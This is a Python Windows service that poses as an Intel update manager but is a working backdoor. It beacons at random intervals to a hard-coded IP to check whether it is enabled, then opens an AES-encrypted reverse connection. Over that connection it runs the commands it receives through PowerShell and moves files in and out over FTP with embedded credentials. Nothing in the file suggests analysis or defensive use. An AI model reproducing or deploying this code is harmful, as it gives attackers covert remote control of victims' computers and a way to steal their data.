import win32serviceutil
import win32service
import win32event
import servicemanager

class MyService(win32serviceutil.ServiceFramework):
    _svc_name_ = "Intel(R) Summer"
    _svc_display_name_ = "Intel(R) Summer"
    _svc_description_ = "Intel(R) update manager"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.stop_event)

    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE, 
                              servicemanager.PYS_SERVICE_STARTED, 
                              (self._svc_name_, ''))
        self.main()

    def main(self):
        import requests
        import socket
        import getpass
        import random
        import time
        import socket
        import threading
        import os
        import subprocess
        import getpass
        from ftplib import FTP
        import time
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad,unpad

        running = False

        def check_client_status():
            hostname = socket.gethostname()
            url = "http://16.171.55.238/client_data.json"
            try:
                response = requests.get(url)
                data = response.json()
                client_list = data.get("client_list", [])
                for client in client_list:
                    if client.get("HostName") == hostname:
                        return client.get("Status", "Unknown")
                return "Hostname not found"
            except Exception as e:
                return f"Error: {str(e)}"

        def start_party():


            HOST = "16.171.55.238"
            PORT = 6565
            ftp_username = "Necati"
            ftp_password = "P;F3nj+qXp.N^H8!*=$#kl"
            aes_key = b'o\x802\x0ez\xe0\x8f\x8b\xc7>\xbf\x9fce\x85\xd3'


            def encrypt_data(data):
                cipher = AES.new(aes_key, AES.MODE_CBC)
                ciphertext = cipher.encrypt(pad(data, AES.block_size))
                return cipher.iv + ciphertext

            def decrypt_data(encrypted_data):
                iv = encrypted_data[:AES.block_size]
                ciphertext = encrypted_data[AES.block_size:]
                cipher = AES.new(aes_key, AES.MODE_CBC, iv)
                decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
                return decrypted_data

            def info(f,client):
                ff = f"\033[32m{f}\033[0m\n"
                client.send(encrypt_data(ff.encode('utf-8')))



            def first_connect(client):
                client.send(encrypt_data(socket.gethostname().encode('utf-8')))
                answer = decrypt_data(client.recv(1024)).decode("utf-8")
                if answer == "whoareyou":
                    client.send(encrypt_data(getpass.getuser().encode("utf-8")))


            def connect():
                while 1:
                    pwd = os.getcwd()
                    client.send(encrypt_data(pwd.encode('utf-8')))
                    response = decrypt_data(client.recv(40960))
                    command = response.decode('utf-8')
                    try:
                        if command.split(" ")[0] == "cd":
                            os.chdir(command.split(" ")[1])
                        elif command == 'close':
                            info("[*] Connection closed !!!",client)
                            break
                        elif command.split(" ")[0] == "ftp":

                            stdout = ftp_connect(command)
                            info(stdout,client)
                            continue
                        stdout = subprocess.check_output(["powershell", "-Command",command])
                    except :
                        stdout = b"\033[32m[*] Command Not Found.\033[0m\n"

                    if stdout:
                        client.send(encrypt_data(stdout))
                    else:
                        client.send(encrypt_data(b"\n"))
                    time.sleep(0.3)



            def ftp_connect(command):
                try:
                    command_parts = command.split()
                    command_type = command_parts[1]
                    filename = command_parts[2]
                    session = FTP()
                    session.connect(HOST)
                    session.login(user=ftp_username, passwd=ftp_password)

                    if command_type == "-d":
                        # Upload file
                        with open(filename, 'rb') as f:
                            session.storbinary(f'STOR {filename}', f)
                        return f"[*] {filename} downloaded successfully."

                    elif command_type == "-u":
                        # Download file
                        with open(filename, 'wb') as f:
                            session.retrbinary(f'RETR {filename}', f.write)
                        return f"[*] {filename}  uploaded successfully."

                    else:
                        return "[*] Invalid option !!!"

                except Exception as e:
                    return f"Error: {e}"



            global client

            client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            client.connect((HOST,PORT))
            first_connect(client)
            while 1:
                command = decrypt_data(client.recv(40960)).decode("utf-8")
                match command:
                        case "connect":
                            connect()
                        case "exit":
                            client.close()
                            break





        while True:
            Timer = random.randint(20,200)
            print(Timer)
            time.sleep(Timer)
            status = check_client_status()
            if status == "True" and running == False:
                start_thread = threading.Thread(target=start_party)
                start_thread.start()
                running =True
            elif status == "False" and running == True:
                running = False





if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(MyService)

